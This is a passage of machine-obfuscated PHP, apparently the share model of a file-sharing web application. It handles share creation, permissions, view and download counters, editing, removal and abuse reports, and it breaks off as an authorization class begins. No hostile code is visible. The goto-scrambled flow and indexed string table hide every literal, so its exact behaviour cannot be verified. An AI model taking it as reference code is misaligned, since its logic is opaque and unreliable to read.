$C´ğø­ÏˆÄ = array()) { goto cÆ‡ˆ Úµ«; a ´ÔˆÎª: $D×‹ŞâÛ·… = $this->add($BÏìÂ„±°‘); $d÷Ğ’æ˜í† = array($FÃ‰»°ÙÊŒ[452] => short_id($D×‹ŞâÛ·…)); $this->where(array($FÃ‰»°ÙÊŒ[449] => $D×‹ŞâÛ·…))->save($d÷Ğ’æ˜í†); goto bÖ‹äß¼©; bÖ‹äß¼©: return $D×‹ŞâÛ·…; goto fÁõ‚×½ º; BİŠ°Èô²: if ($cÆ©ó§ñ¼½ = $this->where($A§ÖëÇ¢)->find()) { return $cÆ©ó§ñ¼½[$FÃ‰»°ÙÊŒ[450]]; } if ($EĞÆ÷ÔÇ¿‚ == 0) { $e¸ªÜŸÛ‚É = array($FÃ‰»°ÙÊŒ[38] => get_path_this($C´ğø­ÏˆÄ[$FÃ‰»°ÙÊŒ[85]])); } else { $e¸ªÜŸÛ‚É = Model($FÃ‰»°ÙÊŒ[761])->sourceInfo($EĞÆ÷ÔÇ¿‚); if (!$e¸ªÜŸÛ‚É) { return !1; } } if (!$C´ğø­ÏˆÄ[$FÃ‰»°ÙÊŒ[1349]]) { $C´ğø­ÏˆÄ[$FÃ‰»°ÙÊŒ[1349]] = $e¸ªÜŸÛ‚É[$FÃ‰»°ÙÊŒ[38]]; } goto C¼íª÷¸–È; C¼íª÷¸–È: $BÏìÂ„±°‘ = array($FÃ‰»°ÙÊŒ[1434] => USER_ID, $FÃ‰»°ÙÊŒ[392] => $EĞÆ÷ÔÇ¿‚, $FÃ‰»°ÙÊŒ[1349] => $FÃ‰»°ÙÊŒ[43], $FÃ‰»°ÙÊŒ[455] => 0, $FÃ‰»°ÙÊŒ[457] => 0, $FÃ‰»°ÙÊŒ[1026] => $FÃ‰»°ÙÊŒ[43], $FÃ‰»°ÙÊŒ[304] => $FÃ‰»°ÙÊŒ[43], $FÃ‰»°ÙÊŒ[808] => $FÃ‰»°ÙÊŒ[43], $FÃ‰»°ÙÊŒ[2254] => 0, $FÃ‰»°ÙÊŒ[2255] => 0, $FÃ‰»°ÙÊŒ[458] => 0, $FÃ‰»°ÙÊŒ[459] => $FÃ‰»°ÙÊŒ[43], $FÃ‰»°ÙÊŒ[452] => $FÃ‰»°ÙÊŒ[43]); $D•ÕÆøå»˜ = explode($FÃ‰»°ÙÊŒ[57], $FÃ‰»°ÙÊŒ[2256]); foreach ($D•ÕÆøå»˜ as $eÉà¸µ¸áë) { if (!isset($C´ğø­ÏˆÄ[$eÉà¸µ¸áë])) { continue; } $BÏìÂ„±°‘[$eÉà¸µ¸áë] = $C´ğø­ÏˆÄ[$eÉà¸µ¸áë]; } goto a ´ÔˆÎª; cÆ‡ˆ Úµ«: $FÃ‰»°ÙÊŒ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $A§ÖëÇ¢ = array($FÃ‰»°ÙÊŒ[392] => $EĞÆ÷ÔÇ¿‚, $FÃ‰»°ÙÊŒ[1434] => USER_ID); if ($EĞÆ÷ÔÇ¿‚ == 0) { $A§ÖëÇ¢ = array($FÃ‰»°ÙÊŒ[2253] => $C´ğø­ÏˆÄ[$FÃ‰»°ÙÊŒ[1026]], $FÃ‰»°ÙÊŒ[1434] => USER_ID); } goto BİŠ°Èô²; fÁõ‚×½ º: } private function _shareAuthSet($d¹³öƒñ¤Æ, $f´ì²šÍë) { goto a±Ğå“†’; BÃ‹®Ñ ì«: $bàß¹¼Õ’½->where(array($Aä‘‹ääçº[450] => $d¹³öƒñ¤Æ))->delete(); $Aœºó†¬Ã¼ = array(); foreach ($f´ì²šÍë as $c‚ÇÙ½ ) { $f•÷Ÿö…¤ = SourceModel::TYPE_USER; if ($c‚ÇÙ½ [$Aä‘‹ääçº[380]] == SourceModel::TYPE_GROUP) { $f•÷Ÿö…¤ = SourceModel::TYPE_GROUP; } $eÜ§•¤’¢Ã = array($Aä‘‹ääçº[450] => $d¹³öƒñ¤Æ, $Aä‘‹ääçº[380] => $f•÷Ÿö…¤, $Aä‘‹ääçº[467] => intval($c‚ÇÙ½ [$Aä‘‹ääçº[467]]), $Aä‘‹ääçº[2258] => 0, $Aä‘‹ääçº[2259] => -1); if ($c‚ÇÙ½ [$Aä‘‹ääçº[2258]]) { $eÜ§•¤’¢Ã[$Aä‘‹ääçº[2258]] = $c‚ÇÙ½ [$Aä‘‹ääçº[2258]]; } else { if ($c‚ÇÙ½ [$Aä‘‹ääçº[2259]]) { $eÜ§•¤’¢Ã[$Aä‘‹ääçº[2259]] = $c‚ÇÙ½ [$Aä‘‹ääçº[2259]]; } } $Aœºó†¬Ã¼[] = $eÜ§•¤’¢Ã; } goto bßñ†ìçç; bßñ†ìçç: return $bàß¹¼Õ’½->addAll($Aœºó†¬Ã¼, array(), !0); goto c±¢¤Óäæ±; a±Ğå“†’: $Aä‘‹ääçº =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!is_array($f´ì²šÍë)) { return !1; } $bàß¹¼Õ’½ = Model($Aä‘‹ääçº[2257]); goto BÃ‹®Ñ ì«; c±¢¤Óäæ±: } public function numViewAdd($D‹ãÏõáôÅ) { $cÈİ“…Ÿ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Eö¥âçÏ‹Ó = array($cÈİ“…Ÿ[449] => $D‹ãÏõáôÅ); $this->where($Eö¥âçÏ‹Ó)->setAdd($cÈİ“…Ÿ[2254]); } public function numDownloadAdd($c‰òí‡Ë±) { $féÌ¯É«Á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $BÜù»äÑÇœ = array($féÌ¯É«Á[449] => $c‰òí‡Ë±); $this->where($BÜù»äÑÇœ)->setAdd($féÌ¯É«Á[2255]); } protected function shareEdit($b—ƒ÷¯àÉ‰, $dìòŞ©ğ‹) { goto AÏø¬Ê•Ùä; E‰½ë±Šš: $this->_checkLinkShare($dìòŞ©ğ‹, $Fèå“àêÉò); $bå´®ÆŠ©Ç = array(); $aÂ‚¤ÚÈÂÊ = explode($a…ÌÉ°ƒøŸ[57], $a…ÌÉ°ƒøŸ[2260]); goto DÖ‚øæ•©Ğ; AÏø¬Ê•Ùä: $a…ÌÉ°ƒøŸ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Fèå“àêÉò = $this->getInfo($b—ƒ÷¯àÉ‰); if (!$Fèå“àêÉò) { return !1; } goto E‰½ë±Šš; DÖ‚øæ•©Ğ: foreach ($aÂ‚¤ÚÈÂÊ as $D’ŠÛ¥ôÈ¶) { if (!array_key_exists($D’ŠÛ¥ôÈ¶, $dìòŞ©ğ‹)) { continue; } $bå´®ÆŠ©Ç[$D’ŠÛ¥ôÈ¶] = $dìòŞ©ğ‹[$D’ŠÛ¥ôÈ¶]; } $this->shareEventAdd($Fèå“àêÉò[$a…ÌÉ°ƒøŸ[378]], $dìòŞ©ğ‹, $a…ÌÉ°ƒøŸ[2081]); $this->where(array($a…ÌÉ°ƒøŸ[449] => $b—ƒ÷¯àÉ‰))->save($bå´®ÆŠ©Ç); goto BÃ¿’Áî¡; BÃ¿’Áî¡: if (isset($dìòŞ©ğ‹[$a…ÌÉ°ƒøŸ[2247]])) { $this->_shareAuthSet($b—ƒ÷¯àÉ‰, $dìòŞ©ğ‹[$a…ÌÉ°ƒøŸ[2247]]); } return !0; goto cá†˜Å‚ˆŠ; cá†˜Å‚ˆŠ: } private function _checkLinkShare($d¼ç…š©œ›, $E©ğùİ‡Æ) { goto d½°ŸïĞíà; d½°ŸïĞíà: $a—ŸÀâš¯é =& $_SERVER[çŞáÓæÚô‚Ô‡]; if ($d¼ç…š©œ›[$a—ŸÀâš¯é[455]] != $a—ŸÀâš¯é[93]) { return; } $dêÀ©Ñ¥Ş  = $E©ğùİ‡Æ[$a—ŸÀâš¯é[400]][$a—ŸÀâš¯é[378]]; goto c²èÏŞÑÂÒ; EäÖÆ­”´Ç: $cãéÜ¿…ê´ = $this->shareFileMeta($dĞ¥‡¯º«[$a—ŸÀâš¯é[428]]); if (isset($cãéÜ¿…ê´[$a—ŸÀâš¯é[368]]) && $cãéÜ¿…ê´[$a—ŸÀâš¯é[368]] == $a—ŸÀâš¯é[93]) { show_json(LNG($a—ŸÀâš¯é[2263]), !1); } goto b”ô‡³äê; c²èÏŞÑÂÒ: if ($E©ğùİ‡Æ[$a—ŸÀâš¯é[400]][$a—ŸÀâš¯é[39]] != $a—ŸÀâš¯é[177]) { $aòí”Ğ¸¦³ = $this->_folderReport($dêÀ©Ñ¥Ş ); if (!$aòí”Ğ¸¦³) { return; } show_json(LNG($a—ŸÀâš¯é[2261]) . $a—ŸÀâš¯é[2262] . $aòí”Ğ¸¦³, !1); } $dĞ¥‡¯º« = Model($a—ŸÀâš¯é[761])->fileInfoGet($E©ğùİ‡Æ[$a—ŸÀâš¯é[400]][$a—ŸÀâš¯é[378]]); if (!$dĞ¥‡¯º«) { return; } goto EäÖÆ­”´Ç; b”ô‡³äê: } private function _folderReport($báÙ¹²ˆ­) { goto fî²ïÃíÀ; A†ˆ“†±Ó»: $Fã‘Øîê¼¥ = array($D·óçó‘­×[428] => array($D·óçó‘­×[17], $C’Ô©Ÿëª), $D·óçó‘­×[470] => array($D·óçó‘­×[760], "\x25{$eé‡’Şßù‰}\45"), $D·óçó‘­×[406] => 0); $F›Á³…÷ğ¨ = Model($D·óçó‘­×[761])->where($Fã‘Øîê¼¥)->field($D·óçó‘­×[2265])->find(); if (!$F›Á³…÷ğ¨) { return !1; } goto b…‹ƒÇì¼â; b…‹ƒÇì¼â: $A¼•Í¾ŞáÈ = substr($F›Á³…÷ğ¨[$D·óçó‘­×[470]], strpos($F›Á³…÷ğ¨[$D·óçó‘­×[470]], $eé‡’Şßù‰)); $Fã‘Øîê¼¥ = array($D·óçó‘­×[378] => array($D·óçó‘­×[17], trim($A¼•Í¾ŞáÈ, $D·óçó‘­×[57]))); $A–ÁÙ¦ù¹ = Model($D·óçó‘­×[761])->where($Fã‘Øîê¼¥)->field($D·óçó‘­×[38])->select(); goto B‡Ñ³ˆÜÄÚ; fî²ïÃíÀ: $D·óçó‘­× =& $_SERVER[çŞáÓæÚô‚Ô‡]; $Fã‘Øîê¼¥ = array($D·óçó‘­×[428] => array($D·óçó‘­×[932], 0), $D·óçó‘­×[698] => 3); $C’Ô©Ÿëª = Model($D·óçó‘­×[2264])->where($Fã‘Øîê¼¥)->field($D·óçó‘­×[428])->select(); goto CÑÀ†å‡§¹; CÑÀ†å‡§¹: if (!$C’Ô©Ÿëª) { return !1; } $C’Ô©Ÿëª = array_to_keyvalue($C’Ô©Ÿëª, $D·óçó‘­×[43], $D·óçó‘­×[428]); $eé‡’Şßù‰ = $D·óçó‘­×[57] . $báÙ¹²ˆ­ . $D·óçó‘­×[57]; goto A†ˆ“†±Ó»; B‡Ñ³ˆÜÄÚ: $fË„íŒ = array_to_keyvalue($A–ÁÙ¦ù¹, $D·óçó‘­×[43], $D·óçó‘­×[38]); $fË„íŒ[] = $F›Á³…÷ğ¨[$D·óçó‘­×[38]]; return implode($D·óçó‘­×[18], $fË„íŒ); goto dÉ£¼®ñãê; dÉ£¼®ñãê: } protected function remove($cùÇÀ„ĞæÕ) { goto F¢Ÿ¥ò; c‡’èË¨“Ü: $d¯¹Ìå„æ = $this->where($b´Œ»ÀŸ³)->delete(); if ($d¯¹Ìå„æ) { Model($dÃÖÑÌ»‘¹[548])->where(array($dÃÖÑÌ»‘¹[450] => $cùÇÀ„ĞæÕ))->delete(); } $FóëÏÙ÷ = is_array($cùÇÀ„ĞæÕ) ? $cùÇÀ„ĞæÕ[1] : array($cùÇÀ„ĞæÕ); goto B¥ÈõÑô¼; B¥ÈõÑô¼: for ($D¯“—¯æ Õ = 0; $D¯“—¯æ Õ < count($FóëÏÙ÷); $D¯“—¯æ Õ++) { $c§óÛ˜è• = $this->getInfo($FóëÏÙ÷[$D¯“—¯æ Õ]); if ($c§óÛ˜è•[$dÃÖÑÌ»‘¹[457]] == $dÃÖÑÌ»‘¹[93]) { Model($dÃÖÑÌ»‘¹[516])->eventShare($c§óÛ˜è•[$dÃÖÑÌ»‘¹[378]], $dÃÖÑÌ»‘¹[2252]); } if ($c§óÛ˜è•[$dÃÖÑÌ»‘¹[455]] == $dÃÖÑÌ»‘¹[93]) { Model($dÃÖÑÌ»‘¹[516])->eventShare($c§óÛ˜è•[$dÃÖÑÌ»‘¹[378]], $dÃÖÑÌ»‘¹[2251]); } } return $d¯¹Ìå„æ; goto a·ÁÍËîÆ…; F¢Ÿ¥ò: $dÃÖÑÌ»‘¹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (is_array($cùÇÀ„ĞæÕ)) { $cùÇÀ„ĞæÕ = array($dÃÖÑÌ»‘¹[17], $cùÇÀ„ĞæÕ); } $b´Œ»ÀŸ³ = array($dÃÖÑÌ»‘¹[450] => $cùÇÀ„ĞæÕ); goto c‡’èË¨“Ü; a·ÁÍËîÆ…: } protected function removeBySource($F®ôÇÌ) { goto FË¤Š•ö¨Ö; BÉ–¾¬»”ò: $this->where($AÏÚò¸ÙÁ)->delete(); Model($bŸòŠÕ–¯‡[548])->where($AÏÚò¸ÙÁ)->delete(); goto Cå§Ë…Óğ; fŒ†æ±«‚: $c‹ô³Ù„ƒ¯ = array_to_keyvalue($c‹ô³Ù„ƒ¯, $bŸòŠÕ–¯‡[43], $bŸòŠÕ–¯‡[450]); if (!$c‹ô³Ù„ƒ¯) { return; } $AÏÚò¸ÙÁ = array($bŸòŠÕ–¯‡[449] => array($bŸòŠÕ–¯‡[393], $c‹ô³Ù„ƒ¯)); goto BÉ–¾¬»”ò; FË¤Š•ö¨Ö: $bŸòŠÕ–¯‡ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $AÏÚò¸ÙÁ = array($bŸòŠÕ–¯‡[392] => array($bŸòŠÕ–¯‡[393], $F®ôÇÌ)); $c‹ô³Ù„ƒ¯ = $this->field($bŸòŠÕ–¯‡[450])->where($AÏÚò¸ÙÁ)->select(); goto fŒ†æ±«‚; Cå§Ë…Óğ: } public function listAll($E£¯ˆÔ½¿) { goto Bæ¾Ì°“¾Ü; dö™åÑ±Úå: $aòØİ¼èÒ = $this->_makeOrder()->where($fŠŒ´² £Ç)->selectPage(20); if (empty($aòØİ¼èÒ[$BåºïÄÊ Ú[363]])) { return array(); } $this->_listDataApply($aòØİ¼èÒ[$BåºïÄÊ Ú[363]]); goto D¹Ì²à–É‘; D¹Ì²à–É‘: return $aòØİ¼èÒ; goto D§Íé¢ğçŸ; Eò¦ÌÍª³ì: if ($E£¯ˆÔ½¿[$BåºïÄÊ Ú[711]]) { $f’åæğƒÂ¹ = $E£¯ˆÔ½¿[$BåºïÄÊ Ú[458]] ? $E£¯ˆÔ½¿[$BåºïÄÊ Ú[458]] : strtotime(date($BåºïÄÊ Ú[2266])); $fŠŒ´² £Ç[$BåºïÄÊ Ú[197]] = array($BåºïÄÊ Ú[330], array($E£¯ˆÔ½¿[$BåºïÄÊ Ú[711]], $f’åæğƒÂ¹)); } if ($E£¯ˆÔ½¿[$BåºïÄÊ Ú[39]]) { $fŠŒ´² £Ç[$E£¯ˆÔ½¿[$BåºïÄÊ Ú[39]]] = 1; } else { $fŠŒ´² £Ç[] = array($BåºïÄÊ Ú[455] => array($BåºïÄÊ Ú[932], 0), $BåºïÄÊ Ú[457] => array($BåºïÄÊ Ú[932], 0), $BåºïÄÊ Ú[2242] => $BåºïÄÊ Ú[2199]); } if ($E£¯ˆÔ½¿[$BåºïÄÊ Ú[2195]]) { $fŠŒ´² £Ç[] = array($BåºïÄÊ Ú[452] => $E£¯ˆÔ½¿[$BåºïÄÊ Ú[2195]], $BåºïÄÊ Ú[1349] => array($BåºïÄÊ Ú[760], "\x25{$E£¯ˆÔ½¿[$BåºïÄÊ Ú[2195]]}\x25"), $BåºïÄÊ Ú[2242] => $BåºïÄÊ Ú[2199]); } goto dö™åÑ±Úå; Bæ¾Ì°“¾Ü: $BåºïÄÊ Ú =& $_SERVER[çŞáÓæÚô‚Ô‡]; $fŠŒ´² £Ç = array(); if ($E£¯ˆÔ½¿[$BåºïÄÊ Ú[1443]]) { $fŠŒ´² £Ç[$BåºïÄÊ Ú[1443]] = $E£¯ˆÔ½¿[$BåºïÄÊ Ú[1443]]; } goto Eò¦ÌÍª³ì; D§Íé¢ğçŸ: } public function listDataApply($C²ˆ²ğ’›°) { $this->_listDataApply($C²ˆ²ğ’›°); return $C²ˆ²ğ’›°; } private function _listDataApply(&$d½¢Å¨øĞê) { goto C±”Ï´‰ò; fõÅ¬„ÍÒ: $A™òä„ğï = array_to_keyvalue($d½¢Å¨øĞê, $aÂæÊ«©„½[43], $aÂæÊ«©„½[378]); $B˜º—õ‹ñ¾ = Model($aÂæÊ«©„½[761])->sourceListInfo($A™òä„ğï, !0); foreach ($d½¢Å¨øĞê as &$F¿Ñ¸»Ë³) { $F–É‡ôìßø = $F¿Ñ¸»Ë³[$aÂæÊ«©„½[1443]]; $F¿Ñ¸»Ë³[$aÂæÊ«©„½[2267]] = $Fâ®ŒóŠÙâ[$F–É‡ôìßø] ? $Fâ®ŒóŠÙâ[$F–É‡ôìßø] : !1; $D·ƒê¬šµ¼ = $F¿Ñ¸»Ë³[$aÂæÊ«©„½[378]]; $F¿Ñ¸»Ë³[$aÂæÊ«©„½[400]] = $B˜º—õ‹ñ¾[$D·ƒê¬šµ¼] ? $B˜º—õ‹ñ¾[$D·ƒê¬šµ¼] : !1; } goto C÷—¾‹¥ŞŞ; C÷—¾‹¥ŞŞ: unset($F¿Ñ¸»Ë³); goto aÛ‹†éË‡‹; C±”Ï´‰ò: $aÂæÊ«©„½ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F×ä„‹ÊŒË = array_to_keyvalue($d½¢Å¨øĞê, $aÂæÊ«©„½[43], $aÂæÊ«©„½[1443]); $Fâ®ŒóŠÙâ = Model($aÂæÊ«©„½[488])->userListInfo(array_unique($F×ä„‹ÊŒË)); goto fõÅ¬„ÍÒ; aÛ‹†éË‡‹: } private function _makeOrder($d¤‹ùÃ£±ğ = '') { goto AµÑ»ƒ»Ã¼; EÛÂ…¼ÂÓ¢: $d¤‹ùÃ£±ğ = $d¤‹ùÃ£±ğ . "{$C„Úè´å´è}\40{$fùÛà‡õåÜ}"; return $this->order($d¤‹ùÃ£±ğ); goto aŠÜÀô¼‰Õ; E«Ù†©‘ˆõ: $C„Úè´å´è = Input::get($e¯Ü‹Ì‡¶Á[416], $e¯Ü‹Ì‡¶Á[17], $e¯Ü‹Ì‡¶Á[398], $D×—ËÜŸÆë); $fùÛà‡õåÜ = Input::get($e¯Ü‹Ì‡¶Á[417], $e¯Ü‹Ì‡¶Á[17], $e¯Ü‹Ì‡¶Á[2268], array($e¯Ü‹Ì‡¶Á[2194], $e¯Ü‹Ì‡¶Á[413])); $fùÛà‡õåÜ = $bòÍ”Ñ×Ï‚[$fùÛà‡õåÜ]; goto EÛÂ…¼ÂÓ¢; AµÑ»ƒ»Ã¼: $e¯Ü‹Ì‡¶Á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D×—ËÜŸÆë = array($e¯Ü‹Ì‡¶Á[197], $e¯Ü‹Ì‡¶Á[458], $e¯Ü‹Ì‡¶Á[2254], $e¯Ü‹Ì‡¶Á[2255]); $bòÍ”Ñ×Ï‚ = array($e¯Ü‹Ì‡¶Á[411] => $e¯Ü‹Ì‡¶Á[412], $e¯Ü‹Ì‡¶Á[413] => $e¯Ü‹Ì‡¶Á[414]); goto E«Ù†©‘ˆõ; aŠÜÀô¼‰Õ: } public function reportAdd($föªÒöÓ¿Ã) { $Aêè…¿è¢÷ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $D¬ÌÊÎƒë = array($Aêè…¿è¢÷[450] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[450]], $Aêè…¿è¢÷[1443] => USER_ID); if (Model($Aêè…¿è¢÷[2264])->where($D¬ÌÊÎƒë)->find()) { return !1; } $d‹„“«ÏÔ = array($Aêè…¿è¢÷[450] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[450]], $Aêè…¿è¢÷[1349] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[1349]], $Aêè…¿è¢÷[378] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[378]], $Aêè…¿è¢÷[428] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[428]], $Aêè…¿è¢÷[1443] => USER_ID, $Aêè…¿è¢÷[39] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[39]], $Aêè…¿è¢÷[414] => $föªÒöÓ¿Ã[$Aêè…¿è¢÷[414]]); return Model($Aêè…¿è¢÷[2264])->add($d‹„“«ÏÔ); } public function reportList($a„…éŸ‰¿ê) { goto càÒã±Å; E¦½êƒ¾Å¾: $AÕ­ÄˆÈ¢ = array($dÀÚ§¿Ëˆİ[411] => $dÀÚ§¿Ëˆİ[412], $dÀÚ§¿Ëˆİ[413] => $dÀÚ§¿Ëˆİ[414]); $fÌØáÖö¤Ş = $dÀÚ§¿Ëˆİ[2272] . $AÕ­ÄˆÈ¢[$aÎÎ¶ßŸá¡]; $d¥æóµ…ŠÓ = Model($dÀÚ§¿Ëˆİ[2264])->where($bÇÌ—œÌ”†)->order($fÌØáÖö¤Ş)->selectPage(20); goto DîÉÁÈªŸÂ; DîÉÁÈªŸÂ: if (empty($d¥æóµ…ŠÓ[$dÀÚ§¿Ëˆİ[363]])) { return array(); } $this->_listDataApply($d¥æóµ…ŠÓ[$dÀÚ§¿Ëˆİ[363]]); return $d¥æóµ…ŠÓ; goto CÊÎïµ½£; bÄ‘ÔÑƒ´²: if (isset($a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[39]]) && in_array($a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[39]], array($dÀÚ§¿Ëˆİ[93], $dÀÚ§¿Ëˆİ[2269], $dÀÚ§¿Ëˆİ[2270], $dÀÚ§¿Ëˆİ[2271], $dÀÚ§¿Ëˆİ[1929]))) { $bÇÌ—œÌ”†[$dÀÚ§¿Ëˆİ[39]] = $a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[39]]; } if (isset($a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[698]]) && in_array($a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[698]], array($dÀÚ§¿Ëˆİ[479], $dÀÚ§¿Ëˆİ[93], $dÀÚ§¿Ëˆİ[2269], $dÀÚ§¿Ëˆİ[2270]))) { $bÇÌ—œÌ”†[$dÀÚ§¿Ëˆİ[698]] = $a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[698]]; } $aÎÎ¶ßŸá¡ = Input::get($dÀÚ§¿Ëˆİ[417], $dÀÚ§¿Ëˆİ[17], $dÀÚ§¿Ëˆİ[2268], array($dÀÚ§¿Ëˆİ[2194], $dÀÚ§¿Ëˆİ[413])); goto E¦½êƒ¾Å¾; càÒã±Å: $dÀÚ§¿Ëˆİ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bÇÌ—œÌ”† = array(); if ($a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[711]]) { $cà‡×÷«´ = $a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[458]] ? $a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[458]] : strtotime(date($dÀÚ§¿Ëˆİ[2266])); $bÇÌ—œÌ”†[$dÀÚ§¿Ëˆİ[197]] = array($dÀÚ§¿Ëˆİ[330], array($a„…éŸ‰¿ê[$dÀÚ§¿Ëˆİ[711]], $cà‡×÷«´)); } goto bÄ‘ÔÑƒ´²; CÊÎïµ½£: } public function reportStatus($e—Œ‰ÚŞ…Ÿ) { goto a‡‘ÇÉ˜í; a‡‘ÇÉ˜í: $b”»ˆâŒîÜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $d–ô˜åŠƒ× = array($b”»ˆâŒîÜ[376] => $e—Œ‰ÚŞ…Ÿ[$b”»ˆâŒîÜ[376]]); $d‚“²™°İÁ = Model($b”»ˆâŒîÜ[2264])->where($d–ô˜åŠƒ×)->field($b”»ˆâŒîÜ[2273])->find(); goto F„™ æêÍ»; F„™ æêÍ»: if (!$d‚“²™°İÁ) { return !1; } $dÍäÍ†²æ = array($b”»ˆâŒîÜ[698] => $e—Œ‰ÚŞ…Ÿ[$b”»ˆâŒîÜ[698]]); if ($e—Œ‰ÚŞ…Ÿ[$b”»ˆâŒîÜ[698]] == $b”»ˆâŒîÜ[2270] && $d‚“²™°İÁ[$b”»ˆâŒîÜ[698]] == $b”»ˆâŒîÜ[2270]) { $dÍäÍ†²æ[$b”»ˆâŒîÜ[698]] = 0; } goto Fèë¡ÓÊ˜; f›æá²‡Ÿ»: return $Bœ¤Í‘¼…; goto d›Íé×ôö; Fèë¡ÓÊ˜: $Bœ¤Í‘¼… = Model($b”»ˆâŒîÜ[2264])->where($d–ô˜åŠƒ×)->save($dÍäÍ†²æ); if ($e—Œ‰ÚŞ…Ÿ[$b”»ˆâŒîÜ[698]] == $b”»ˆâŒîÜ[2269]) { if ($d‚“²™°İÁ[$b”»ˆâŒîÜ[428]] != $b”»ˆâŒîÜ[479] && $this->shareFileMeta($d‚“²™°İÁ[$b”»ˆâŒîÜ[428]])) { $this->shareFileMeta($d‚“²™°İÁ[$b”»ˆâŒîÜ[428]], 0); } $this->remove($d‚“²™°İÁ[$b”»ˆâŒîÜ[450]]); return !0; } if ($Bœ¤Í‘¼… && $e—Œ‰ÚŞ…Ÿ[$b”»ˆâŒîÜ[698]] == $b”»ˆâŒîÜ[2270]) { $d‘ã–‚Ñé† = $dÍäÍ†²æ[$b”»ˆâŒîÜ[698]] == $b”»ˆâŒîÜ[2270] ? 1 : 0; $this->shareFileMeta($d‚“²™°İÁ[$b”»ˆâŒîÜ[428]], $d‘ã–‚Ñé†); $this->removeByFile($d‚“²™°İÁ[$b”»ˆâŒîÜ[428]]); } goto f›æá²‡Ÿ»; d›Íé×ôö: } private function removeByFile($CŠ¸±ÛŠø¬) { goto D¾…°»ôÔÛ; BÒ›ÛÇ…Áí: $bïğÜ²Ú§Ñ = array_to_keyvalue($bó®Ô–¤˜, $a‘ù’ÅØŠ[43], $a‘ù’ÅØŠ[450]); $this->remove($bïğÜ²Ú§Ñ); goto E³ÖĞÓâ´Ş; D¾…°»ôÔÛ: $a‘ù’ÅØŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $bó®Ô–¤˜ = Model($a‘ù’ÅØŠ[761])->where(array($a‘ù’ÅØŠ[428] => $CŠ¸±ÛŠø¬))->field($a‘ù’ÅØŠ[378])->select(); $AŠ¯ÛÔ¡«¢ = array_to_keyvalue($bó®Ô–¤˜, $a‘ù’ÅØŠ[43], $a‘ù’ÅØŠ[378]); goto fôŸÔÉöÈ‰; fôŸÔÉöÈ‰: $EÈæÜÜ´ç— = array($a‘ù’ÅØŠ[378] => array($a‘ù’ÅØŠ[17], $AŠ¯ÛÔ¡«¢), $a‘ù’ÅØŠ[455] => 1); $bó®Ô–¤˜ = Model($a‘ù’ÅØŠ[2091])->where($EÈæÜÜ´ç—)->field($a‘ù’ÅØŠ[450])->select(); if (empty($bó®Ô–¤˜)) { return; } goto BÒ›ÛÇ…Áí; E³ÖĞÓâ´Ş: } private function shareFileMeta($F³£¼ĞÌ, $A¾’ù¨°óï = null) { $DÚ—¼—á =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F½İ±©Äƒ® = array($DÚ—¼—á[428] => $F³£¼ĞÌ, $DÚ—¼—á[99] => $DÚ—¼—á[2274]); if (is_null($A¾’ù¨°óï)) { return Model($DÚ—¼—á[2275])->where($F½İ±©Äƒ®)->find(); } $F½İ±©Äƒ®[$DÚ—¼—á[368]] = $A¾’ù¨°óï; Model($DÚ—¼—á[2275])->add($F½İ±©Äƒ®, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\x72\143\145\137\x61\x75\164\150"; public function getAuth($eÃ‡«Àê…‰) { goto aÊ±ì„ ãæ; eå˜ªØ õÈ: $A¥÷Ì­Ê¨ = $this->field($b¿‚¸ëÅèÊ)->order($BêÈ‘ß¢ Ä[376])->where($CÓÀßËÄ—)->select(); $F•°ã†à§¤ = array(); $f…Æ¡™î¿ = array(); goto aÓ¼ÃºÙ; aÊ±ì„ ãæ: $BêÈ‘ß¢ Ä =& $_SERVER[çŞáÓæÚô‚Ô‡]; $b¿‚¸ëÅèÊ = $BêÈ‘ß¢ Ä[2276]; $CÓÀßËÄ— = array($BêÈ‘ß¢ Ä[378] => $eÃ‡«Àê…‰); goto eå˜ªØ õÈ; aÓ¼ÃºÙ: $b©˜ëë”øó = 2 << 25; foreach ($A¥÷Ì­Ê¨ as $b‰Î”øËô) { goto F•çê›îé×; Fî¹á†ç‘: $eŸšÚ£†Ö = 0; if ($b‰Î”øËô[$BêÈ‘ß¢ Ä[380]] == SourceModel::TYPE_GROUP) { $eŸšÚ£†Ö = $b©˜ëë”øó * 2; } if ($b‰Î”øËô[$BêÈ‘ß¢ Ä[380]] == SourceModel::TYPE_USER) { $eŸšÚ£†Ö = $b©˜ëë”øó; } goto Bñ©ãÒùŒ ; Bñ©ãÒùŒ : if ($b‰Î”øËô[$BêÈ‘ß¢ Ä[380]] == SourceModel::TYPE_USER && $b‰Î”øËô[$BêÈ‘ß¢ Ä[467]] == $BêÈ‘ß¢ Ä[479]) { $eŸšÚ£†Ö = 0; } $f…Æ¡™î¿[] = $c Íñ¯÷¶ì[$BêÈ‘ß¢ Ä[385]] + $eŸšÚ£†Ö; goto CÌ¥›­ ›; F•çê›îé×: $c Íñ¯÷¶ì = Model($BêÈ‘ß¢ 